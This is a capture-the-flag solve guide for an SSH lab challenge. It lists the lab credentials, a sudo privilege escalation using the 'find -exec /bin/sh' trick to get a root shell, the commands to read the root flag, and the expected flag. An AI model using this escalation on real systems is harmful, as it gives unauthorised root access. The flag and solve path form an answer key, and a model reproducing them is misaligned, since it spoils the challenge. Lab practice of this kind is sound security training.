# 13-latveria-breach - Testing & Solve Guide

## 1. Challenge setup
- **Start**: `cd ctf-platform/challenges/13-latveria-breach && docker compose up -d`
- **Ports**: 2229
- **Protocol**: SSH
- **Credentials**: Username: `intruder` | Password: `doom_is_master`

## 2. How to access it
```bash
ssh intruder@127.0.0.1 -p 2229
# (Password: doom_is_master)
```

## 3. Intended solve path
1. SSH into the server: `ssh -p 2229 intruder@127.0.0.1`.
2. Check privileges using `sudo -l`: note allowed command `sudo /usr/bin/find`.
3. Exploit GTFOBins for `find` to escalate privileges to root:
   ```bash
   sudo find . -exec /bin/sh \; -quit
   ```
4. Read the sovereign override flag from `/root/flag.txt`:
   ```bash
   cat /root/flag.txt
   ```
5. Disarm the defense grid countdown:
   ```bash
   /usr/local/bin/abort_destruct "$(cat /root/flag.txt)"
   ```

**Expected Flag**: `YUVA{d00ms_dyn4m1c_fl4g_1337}`
